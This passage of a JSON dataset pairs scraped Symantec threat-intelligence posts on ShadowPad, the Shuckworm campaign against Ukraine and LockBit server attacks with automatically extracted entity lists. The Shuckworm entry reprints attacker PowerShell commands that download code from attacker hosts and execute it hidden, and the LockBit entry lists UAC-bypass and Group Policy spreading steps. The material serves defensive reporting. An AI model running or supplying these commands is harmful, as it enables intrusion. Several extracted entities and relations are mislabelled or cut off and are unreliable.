20c767d32304ed2812ed8186dc14ddaaae581481c6dee26447a904fcaa67db2a – NBTScan cf5537af7dd1d0dbb77e327474aa58b2853cb1a1d4190991ac3d9ca40b7841aa – NBTScan df9a2471c23790a381e286bb96ea3401b94686b7ca067297a7920a76a7202112 – Loader 05fb86d34d4fa761926888e5347d96e984bbb1f3b693fe6c3ab77edb346f005b – FScan aba3e885768a6436b3c8bc208b328620f001c63db7a3efe6142e653cdf5dfbf7 – FScan 0f81c3850bc82a7d1927cf16bfad86c09414f8be319ef84b44a726103b7d029d – Powerview 9f04c46e0cdaa5bce32d98065e1e510a5f174e51b399d6408f2446444cccd5ff – TCPing 12534f7014b3338d8f9f86ff1bbeacf8c80ad03f1d0d19077ff0e406c58b5133 – Ladon 23d0eff3c37390d38e6386a964c88ac2dafbace92090a762ae9e23bd49510f09 – WebPass 3e53deb5d2572c0f9fae10b870c8d4f5fdc7bd0fe1cc3b15ca91b31924373136 – WebPass 2f1520301536958bcf5c65516ca85a343133b443db9835a58049cd1694460424 – ProcDump 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9 – Mimikatz 38d4456b38a2896f23cad615e3c9167e65434778074a9b24af3cbc14d1e323bf – cmd.exe (tampered copy of legitimate cmd.exe) 77358157efbf4572c2d7f17a1a264990843307f802d20bad4fb2442245d65f0b – ProcessExplorer 88.218.193.76 (used to host malware) The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (espionage attackers, Attacker), (ShadowPad RAT, Malware), (DLL side-loading, Technique)\nRelationships: (espionage attackers, uses, ShadowPad RAT), (espionage attackers, employs, DLL side-loading)",
      "entities": [
        [
          "espionage attackers",
          "Attacker"
        ],
        [
          "ShadowPad RAT",
          "Malware"
        ],
        [
          "DLL side-loading",
          "Technique"
        ]
      ],
      "relationships": [
        [
          "espionage attackers",
          "uses",
          "ShadowPad RAT"
        ],
        [
          "espionage attackers",
          "employs",
          "DLL side-loading"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 3,
    "relationship_count": 2
  },
  {
    "title": "russia ukraine shuckworm",
    "link": "https://www.security.com/threat-intelligence/russia-ukraine-shuckworm",
    "content": "UPDATE, 17.40 BST, August 15, 2022: Update for clarity re use of VCD, ASC, and H264 file extensions in file names. UPDATE, 17.50 BST, August 17, 2022:Additional IOCs added Recent Shuckworm activity observed by Symantec, a division ofBroadcom Software, and aimed at Ukraine appears to be delivering information-stealing malware to targeted networks. This activity was ongoing as recently as August 8, 2022 and much of the activity observed in this campaign is consistent with activity that was highlighted byCERT-UAon July 26. The activity observed by Symantec began on July 15, and we have additional indicators of compromise (IOCs) and technical details to share about this campaign. Shuckworm (aka Gamaredon, Armageddon) is a Russia-linked group that has almost exclusively focused its operations on Ukraine since it first appeared in 2014. It is generally considered to be a state-sponsored espionage operation. The first suspicious activity Symantec saw on victim systems was a self-extracting 7-Zip file, which was downloaded via the system’s default browser. Subsequently, mshta.exe downloaded an XML file, which was likely masquerading as an HTML application (HTA) file. These files were downloaded from the following domain: a0698649[.]xsph[.]ru. It has been publicly documented since May 2022 that subdomains of xsph[.]ru are associated with Shuckworm activity, and this domain was once again mentioned in CERT-UA’s July 26 publication about Shuckworm activity. This domain was also associated with an email that spoofed being from the Security Service of Ukraine and had “Intelligence Bulletin” in the subject line, according to CERT-UA. This being the case, it is most likely the 7-Zip file seen on victim networks in the campaign observed by Symantec was delivered to victims via email. The downloading of the XML file onto victim networks was followed by the execution of a PowerShell stealer. We saw three versions of the same PowerShell stealer appear on the one system. It’s possible the attackers may have deployed multiple versions of the stealer, which were all very similar, as an attempt to evade detection. Two VBS downloaders that had the words “juice” and “justice” in their file names were also observed on victim machines. Analysis found that these were Backdoor.Pterodo, a well-known Shuckworm tool that Symantecblogged about earlier this year. These scripts are capable of calling PowerShell, uploading screenshots, and also executing code downloaded from a command-and-control (C&C) server. Various suspicious files containing “ntuser” in the file names were also seen on victim machines. We associate these “ntuser” files with Shuckworm activity, and many variants of them are malicious, with most detected as the Giddome backdoor, another well-known Shuckworm tool. We saw various parent processes with file names that had VCD, H264 and ASC extensions. A file namedntuser.dat.tmcontainer.vcdwas the parent process for a Giddome backdoor variant namedntuser.dat.tm.descendant.exethat was seen on victim machines. A suspicious file namedntuser.dat.tmcontainer.h264had a child process namedntuser.dat.tm.declare.exe, another malicious Giddome backdoor binary. Elsewhere, a file namedntuser.dat.tmcontainer.aschad a child process namedntuser.dat.tm.decay.exe. VCD files are disc images of a CD or DVD and are recognized by Windows as an actual disc, similar to ISO files, which we commonly see malicious actors use to deliver payloads. An ASC file is an encrypted file that may contain text or binary information encoded as text, while an H264 file is a video file. However, filenames with thentuser.dat.tmcontainerprefix are files that represent the registry. It’s not clear if these are the actual file types, or if the attackers are using these file names as a means of sowing confusion. The backdoor dropped on victim systems had the file name4896.exe. This backdoor had multiple capabilities, including: The legitimate remote desktop protocol (RDP) tools Ammyy Admin and AnyDesk were both also leveraged by the attackers for remote access. Legitimate RDP tools like these and others are frequently leveraged for remote access by attackers in both ransomware and nation-state-backed cyber attacks. This campaign, combined with previous public reporting on Shuckworm, shows some patterns in the operations of the group at the moment, including its reuse of patterns, e.g. paths (such as csidl_profile\\music), using files that contain \"ntuser.dat\" in the file name, using various artifacts that contain, for example, \"judgement\" in the file name, and also leveraging EXE files whose file names contain English words that begin with \"D\", “dat”, “decay”, “deer”, “declare”, etc. As the Russian invasion of Ukraine approaches the six-month mark, Shuckworm’s long-time focus on the country appears to be continuing unabated. That this recent activity continues even after CERT-UA documented it shows that fear of exposure does not deter the group from its activities. While Shuckworm is not necessarily the most tactically sophisticated espionage group, it compensates for this in its focus and persistence in relentlessly targeting Ukrainian organizations. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. SHA256 filesabb6aab63b29610dbc0a6d634b6777ff0a2a2b61c5f60bd09b0c3aa3919fa00d63490fc0828f9683f5dd5799452d684dcc32db28d683943b2bad5b56eee6f03eb66cc523b88505cc2cc0568e97c9a80b1ceae448c8ac7d7b0d9c0f36378d8c2f26fcfbbfe4deeae3797bc7999c641f7a93e5a7eb378cf998069d88060801c47d1f8a4cf57052e66d4de953fcda3aca627308f93b6560934959d745ca6dda66d91aceb88288dd40535fdddcbdc1aa174109fe897122d693280d6ccec827f4df0bea4ba2c43bc3d18e5d01168ff4f864cbf727e3cb8b9cce5c3f75a27c91d63d849da410a62fb552a593b6da8ee89aa451efb6efcd1f3a35fab24e3c04fec84030420fccd78efe1e4739c3a694afada023e1ce425c29a0affa91bf02c16912d143e5f34a99d6799c4ff3a4b06e4f42ff136c1a0f59dd4629f3e4da3a7a93e7c88ed358e4b6afd14fd7b058e0deaeca0bf3537edc264ef7674c1c49db35b82b2d24f151d2b404315afe4951cbd870866e8fbb11d05d3752ad096bf00d68072d2262f1c65464f2a86cb6ad6c6792c7553d4162849b5a229fcc396c737edffdb1ee80c40aaaecb9331f1ddac9fe9b6d3455ecfd7b21b53159453f7fa3a82e3d5f9ecc2c7943730f3dfb89f534fcb137a4f6e53a7a697309e6cc247f0f9800f1460731b783b82e846bd8a623ca32982585cf8b79ce7cbf9988a041f7b2ac7fe5f8a7fe66d2b38589d08bbbe56b34b88bcefc702cdc6593c71e5ee446dbbb115336b876ac862717600c531846895f8884841d23e52c8332e708ca11c17a5c162ce43432b9c8ec91559a62baf87305e0ee387bb777da7830a6d9fc72c630e873858ec465d7d4077af0aff349821f0e964f42db5ab09eb8b2f427f266378aaa1d28af6c573f3667294731e3bdbf13d96d32a98342e225601f20157f774917d9147ce692a4597c517c81a53f7a32a67eb2b15e51a95b6bfdd4a33b11850b08eccf6e29d098184b5ff96d90a46ad33ba82faa2bb298282e7c35afc0ab96f884f668ad098e6120b1f6fec7a0f09c64e7e09de7952b7532f8c9cd4b45177d2125d84c6a40ec738cbae307b9efdb760cc97468ee7a363d5204559ab21e7982d63867cc13c6b09892953773c3b405f341df8e68bd8a23cbc9b8fd6c708082aab91632d6cb84bac28a5933f7248d1cf2dba19980efaf4f5d5b139563a22cec81df276661c014645022ddb97a23a9010b445b08a807b22a997174f528e87604be0bba4e0ccfa18050b26e8d55828dc8143b68ef6140eab7e5e7e59e6b9e104e032b28f5058a127d51efd099e4900b692a362cf29a12cd2a100a99b1dd29cfaac4b456808795c07b0f3fc80fcbf9e813d00af3f54714f79d7accd3888689ac6c5d02a750d804f4e5c330761d0a9b08c69cfdd135c69a537aef0df516b097cd9d6a0d9528bc907f4dddaa97a858124fb47ea2572a197bd762da9c19bac91bdd4c17469c2e48480e80883790ddd924b08942f3ecb6da5a32df090274b90829e651f984f287c00db0459202963acfa5622901de83cb75fad5bef35902d0ae42310d47f7433379dd3543e86461d0693801d8d523df9d2d0cd5a652d72c10acec8fab7344bb141c459543e18b1e48dfab33ed67f8ccd788904f2cd4be521ff152a477cec4baba52b56aec155f05ba566a66531b988c5a1dceee0b4a7bc2dc34ad2b68d984486e02891a4f6c3dc83f72a830c54980738467fb36e7b6b5da80e0d9657bd440dcad46ae9f96a2f895adfe7882bac956f31ec14fb52ea118138257d4a95fb9e1bb6f4e846d07b871fdd0edf4699051f5506f34f2663938faeca9400dae1c034ddb6b710d41c7d74b9023dbaadd588dad670c49e5a202ae695e12689618f926249d49a935c07315ef7eb27e19d11894b52148fbe8987b5726ef4390a56aa47a9a4bbe4b17dd0876 Host IOCsntuser.dat.tm.declare.exe / 2d0792d3f9d5a921a2d5b476feb88a345869d2f0d95f7342cc10ac1c838896cbjury.mp3 / 4a2b252eccab7da63aadb7a5539cc4ed8385d7bf258c325dea60ed0edc3e0e25joy.dat / b62bf1a504a474e259d78fc3349eed94982d6bf6af6012e23a1ec14b3d156dc9do594e.tmp / 09709be5f7cbb076166d004265a378504f05832ba461f59181b96b374c31a4b3cronos.exe / c3b7a1a739e3641147f4c10c5acfbc5816c12892b0edbe8038928f236f44ec84delve.prj / fd61dee37bafb3392fa4450d2afef18cf6b4b3fc5c87476de128c999e58cae593893.bmp.vbs / c0a317f60910eed08bbfc7b3ac6e6de1b2029bf4922d0b0d7d3759313a24b16c Network IOCsdestroy.asierdo[.]ruhxxp://destroy.asierdo[.]ru/45.63.94[.]49165.22.215[.]30149.28.99[.]18745.63.79[.]134140.82.58[.]157139.180.172[.]67141.164.45[.].23695.179.167[.]182140.82.47[.]97159.223.235[.]224138.68.254[.]91217.163.30[.]126144.202.54[.]111159.89.129[.]22207.246.80[.]1hxxp://159.223.235[.]224/crab/crevice.elga0698649.xsph[.]ruhxxp://a0698649.xsph[.]ru/preparations/band.xml157.245.99[.]132hxxp://157.245.99[.]132/get.php194.180.174[.]73hxxp://194.180.174[.]73/1.txt*.pasamart[.]ru155.138.252[.]221hxxp://155.138.252[.]221/get.php68.183.9[.]9hxxp://68.183.9[.]9/get.phpmotoristo.ru178.62.108[.]75hxxp://motoristo[.]ru/get.phpheato[.]ru140.82.54[.]136hxxp://heato[.]ru/index.phpleonardis[.]ru104.238[.]187.145141.8.192[.]82139.59.65[.]168hxxp://139.59.65[.]168/journal.au45.63.100[.]72hxxp://45.63.100[.]72/get.php?fr=3126424&se=3089412&dl=hxxps://meta[.]ua/uk/news/politics/52320-ukrayina-rozshirila-oboronnu-spivpratsyu-z-danieyu/&rm=hxxps://meta[.]ua/uk/&kf=false&ts=5875621&dw=2240&dh=1951&t=2053953&s=stable&eec=3242252&po=6485826&ju=8204688&kio=false&rqm=GET199.247.25[.]79hxxp://199.247.25[.]79/get.php Command linesCSIDL_PROFILE\\appdata\\local\\temp\\1645694127.exeCSIDL_PROFILE\\downloads\\anydesk (2).exeCSIDL_PROFILE\\ntuser.dat.tm.decay.exeCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\17634.bmp CSIDL_PROFILE\\appdata\\local\\temp\\17634.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c del /f /q CSIDL_PROFILE\\29630.ico.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\17634.bmpCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\17634.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmpCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo '>>C:\\Users\\User\\29630.icoCSIDL_SYSTEM\\cmd.exe /c echo '>C:\\Users\\User\\29630.ico.vbsCSIDL_SYSTEM\\cmd.exe /c echo '17634.bmp>> CSIDL_PROFILE\\appdata\\local\\temp\\17634.bmpCSIDL_SYSTEM\\cmd.exe /c echo '5491.bmp>> CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmpCSIDL_SYSTEM\\cmd.exe /c rename CSIDL_PROFILE\\29630.ico 29630.ico.txtCSIDL_SYSTEM\\cmd.exe /c rename CSIDL_PROFILE\\29630.ico.txt 29630.ico.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\29630.ico.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\17634.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp.vbsCSIDL_SYSTEM\\mshta.exe hxxp://a0698649.xsph[.]ru/preparations/band.xml /fCSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell.exe -nol -nop echo (INVOKE-EXPRESSION(new-object net.webclient).downloadstring('hxxp://157.245.99[.]132/get.php')) | powershell -CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell.exe -windowstyle hidden -nologo Invoke-Expression $env:IncludeCSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell.exe $aaa = (New-Object system.Net.WebClient).downloadString('hxxp://194.180.174[.]73/1.txt'); iex $aaa;CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.pasamart.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/lnk.php'); Visible = $False};while ($IE1.ReadyState -ne 4) {Start-Sleep 2};$Doc = $IE1.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $IE1.document, $Null).InnerHtml;$IE1.quit();[io.file]::WriteAllText($($env:USERPROFILE+'\\index.txt'),$Doc); iex(iex $Doc)CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell.exe $tmp = $(New-Object net.webclient).DownloadString('hxxp://155.138.252[.]221/get.php'); Invoke-Expression $tmpCSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell.exe $tmp = $(New-Object net.webclient).DownloadString('hxxp://68.183.9[.]9/get.php'); Invoke-Expression $tmpCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\29630.ico.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\17634.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\ho2btvivw2m.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\ntuser.dat.tmcontainer.asc //e:vbscript /deserve /decidedly /dene //bCSIDL_SYSTEMX86\\windowspowershell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfileCSIDL_SYSTEM\\cmd.exe /c CSIDL_PROFILE\\appdata\\local\\temp\\7zsfx000.cmdCSIDL_SYSTEM\\cmd.exe /c start /min  powershell -w hidden -c (iex echo (iex (new-object net.webclient).downloadstring('hxxp://motoristo[.]ru/get.php'))|powershell - )CSIDL_WINDOWS\\explorer.exepowershell -w hidden -c (iex echo (iex (new-object net.webclient).downloadstring('hxxp://motoristo[.]ru/get.php'))|powershell - )powershell -w hiddeN -c (iex echo (iex (new-object net.webclient).downloadstring('hxxp://sacramentos[.]ru/get.php'))|powershell - )wscript.exe CSIDL_PROFILE\\ntuser.dat.tmcontainer.asc //e:vbscript /deserve /decidedly /dene //bwscript.exe CSIDL_PROFILE\\documents\\jury.mp3 jenny //e:VBScript //b jokeCSIDL_PROFILE\\cronos.exeCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\3893.bmp CSIDL_PROFILE\\appdata\\local\\temp\\3893.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\3893.bmpCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\3893.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo '3893.bmp>> CSIDL_PROFILE\\appdata\\local\\temp\\3893.bmpCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\3893.bmp.vbs CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell.exe -nol -nop $nwc = new-object net.webclient;$nwc.headers['Accept']='image/avif,image/webp,*/*';$nwc.headers['Accept-Encoding']='*';$nwc.headers['Accept-Language']='en-US,en;q=0.5';$nwc.headers['Alt-Used']='www.facebook.com';$nwc.headers['Referer']='https://meta.ua/';$nwc.headers['Sec-Fetch-Dest']='document';$nwc.headers['Sec-Fetch-Mode']='no-cors';$nwc.headers['Sec-Fetch-Site']='cross-site';$nwc.headers['TE']='trailers';$nwc.headers['User-Agent']='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0';$code=([system.text.encoding]::utf8.getstring($nwc.DownloadData('http://45.63.100.72/get.php?fr=3126424&se=3089412&dl=https://meta.ua/uk/news/politics/52320-ukrayina-rozshirila-oboronnu-spivpratsyu-z-danieyu/&rm=https://meta.ua/uk/&kf=false&ts=5875621&dw=2240&dh=1951&t=2053953&s=stable&eec=3242252&po=6485826&ju=8204688&kio=false&rqm=GET')));echo $code|iex CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell.exe $tmp = $(New-Object net.webclient).DownloadString('http://199.247.25.79/get.php'); Invoke-Expression $tmpCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\3893.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\delve.prj //e:vbscript /departments /dependant /despite //bCSIDL_SYSTEM\\cmd.exe /c CSIDL_PROFILE\\appdata\\local\\temp\\7zsfx000.cmdCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\10805.bmp CSIDL_PROFILE\\appdata\\local\\temp\\10805.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\14612.bmp CSIDL_PROFILE\\appdata\\local\\temp\\14612.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\19084.bmp CSIDL_PROFILE\\appdata\\local\\temp\\19084.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\20342.bmp CSIDL_PROFILE\\appdata\\local\\temp\\20342.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\26012.bmp CSIDL_PROFILE\\appdata\\local\\temp\\26012.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\5275.bmp CSIDL_PROFILE\\appdata\\local\\temp\\5275.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c del /f /q CSIDL_PROFILE\\30802.ico.vbsCSIDL_SYSTEM\\cmd.exe /c del /f /q CSIDL_PROFILE\\8527.ico.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\10805.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\14612.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\19084.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\20342.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\26012.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\5275.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo '>C:\\Users\\User\\30802.ico.vbsCSIDL_SYSTEM\\cmd.exe /c echo '>C:\\Users\\User\\8527.ico.vbsCSIDL_SYSTEM\\cmd.exe /c rename CSIDL_PROFILE\\30802.ico.txt 30802.ico.vbsCSIDL_SYSTEM\\cmd.exe /c rename CSIDL_PROFILE\\8527.ico.txt 8527.ico.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\30802.ico.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\8527.ico.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\10805.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\14612.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\19084.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\20342.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\26012.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\5275.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\30802.ico.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\8527.ico.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\10805.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\14612.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\19084.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\20342.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\26012.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\5275.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp.vbs The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (UPDATE, Event), (17.40 BST, Time), (August 15, 2022, Date), (UPDATE, Event), (17.50 BST, Time), (August 17, 2022, Date), (additional IOCs, Indicator), (ASC, Tool), (H264, Tool), (VCD, Tool), (shuckworm, Attacker), (Gamaredon, Attacker), (Armageddon, Attacker), (CERT-UA, Organization), (mshta.exe, Tool), (7-Zip, Tool), (a0698649[.]xsph[.]ru, Domain), (xsph[.]ru, Domain), (July 26, 2022, Date), (July 15, 2022, Date)\nRelationships: (UPDATE, occursOn, August 15, 2022), (UPDATE, occursOn, August 17, 2022), (UPDATE, resolvesTo, 17.40 BST), (UPDATE, resolvesTo, 17.50 BST), (UPDATE, contains, additional IOCs), (UPDATE, contains, indicator), (UPDATE, contains, ASC), (UPDATE, contains, H264), (UPDATE, contains, VCD), (UPDATE, contains, shuck",
      "entities": [
        [
          "UPDATE",
          "Event"
        ],
        [
          "17.40 BST",
          "Time"
        ],
        [
          "August 15",
          "2022",
          "Date"
        ],
        [
          "UPDATE",
          "Event"
        ],
        [
          "17.50 BST",
          "Time"
        ],
        [
          "August 17",
          "2022",
          "Date"
        ],
        [
          "additional IOCs",
          "Indicator"
        ],
        [
          "ASC",
          "Tool"
        ],
        [
          "H264",
          "Tool"
        ],
        [
          "VCD",
          "Tool"
        ],
        [
          "shuckworm",
          "Attacker"
        ],
        [
          "Gamaredon",
          "Attacker"
        ],
        [
          "Armageddon",
          "Attacker"
        ],
        [
          "CERT-UA",
          "Organization"
        ],
        [
          "mshta.exe",
          "Tool"
        ],
        [
          "7-Zip",
          "Tool"
        ],
        [
          "a0698649[.]xsph[.]ru",
          "Domain"
        ],
        [
          "xsph[.]ru",
          "Domain"
        ],
        [
          "July 26",
          "2022",
          "Date"
        ],
        [
          "July 15",
          "2022",
          "Date"
        ]
      ],
      "relationships": [
        [
          "UPDATE",
          "occursOn",
          "August 15",
          "2022"
        ],
        [
          "UPDATE",
          "occursOn",
          "August 17",
          "2022"
        ],
        [
          "UPDATE",
          "resolvesTo",
          "17.40 BST"
        ],
        [
          "UPDATE",
          "resolvesTo",
          "17.50 BST"
        ],
        [
          "UPDATE",
          "contains",
          "additional IOCs"
        ],
        [
          "UPDATE",
          "contains",
          "indicator"
        ],
        [
          "UPDATE",
          "contains",
          "ASC"
        ],
        [
          "UPDATE",
          "contains",
          "H264"
        ],
        [
          "UPDATE",
          "contains",
          "VCD"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 20,
    "relationship_count": 9
  },
  {
    "title": "lockbit targets servers",
    "link": "https://www.security.com/threat-intelligence/lockbit-targets-servers",
    "content": "Symantec, a division ofBroadcom Software, has observed threat actors targeting server machines in order to spread the LockBit ransomware threat throughout compromised networks. In one attack observed by Symantec, LockBit was seen identifying domain-related information, creating a Group Policy for lateral movement, and executing a \"gpupdate /force\" command on all systems within the same domain, which forcefully updates group policy. LockBit is a ransomware-as-a-service (RaaS) operated by malicious actors Symantec tracks as Syrphid. Shortly after it first appeared in September 2019, the Syrphid gang expanded its operations, using a network of affiliates to deploy the LockBit ransomware on victim networks. The ransomware, which has currently reachedversion 3.0, has evolved over the past few years, as has its operators who have recentlylaunched a bug bounty programin order to weed out weaknesses in the malware’s code and the RaaS operation as a whole. In one observed instance, before dropping and executing the LockBit ransomware, an attacker had RDP access to the enterprise network for a couple of weeks at least. This access may have been obtained through remote desktop applications such as AnyDesk or Windows RDP, or by exploiting a known vulnerability, etc. LockBit behaves differently on server machines with domain controllers than on Windows 10 machines. When executed on a server, it has the capability to spread through the network using Group Policy. On Windows 10 machines it performs routine ransomware activity and encrypts files. When LockBit is executed on a server machine it carries out the following actions: 3. End running processes and disable services 4. Privilege escalation A. Exploiting USERENV.dll to bypass UAC B. Bypass method in hfiref0x’s UACME C. Exploiting the ICMLuaUtil elevated COM Interface-Object 6. LockBit creates a copy of itself under the SYSVOL directory “c:\\windows\\sysvol\\domain\\scripts\\< Lockbit executable>” 7. Creating a Group Policy: Computer configurations: 9. Executes gpupdate command on the domain controller where LockBit is running. Also runs gpupdate to run policies from the computer configurations and user configurations. 12. Encrypts files and appends the .lockbit file extension. LockBit has been one of, if not the most active of RaaS gangs in 2022. The drop in Conti activity in May helped LockBit reach the top spot, with some reports stating that the threat was behind as much as40% of ransomware attacks. LockBit’s success is also due to its developers and affiliates continued evolution of features and tactics, which include the malware’sfast encryption speed, ability to target both Windows andLinux machines, itsbrash recruitment drives, andhigh-profile targets. In addition, as previously mentioned, the launch of a rewards program for vulnerabilities in LockBit’s code and for suggestions on improving the RaaS operation will no-doubt help the ransomware remain a serious threat to organizations. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. For the latest protection updates, please visit theSymantec Protection Bulletin. Symantec Endpoint Protection (SEP) protects against ransomware attacks using multiple static and dynamic technologies. Intrusion Prevention System (IPS) Protection Symantec Data Center Security (DCS) hardening policies for Windows Servers and Domain Controllers prevent LockBit ransomware installation. The default DCS lockdown prevents lateral movement of LockBit ransomware on the network and protects servers from LockBit execution attempts to tamper with Group Policies and critical system resources. Vishal is member of Symantec’s Security Technology and Response team where he is focused on researching future cyber threats. Lahu is member of Symantec’s Security Technology and Response team where he is focused on researching future cyber threats. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
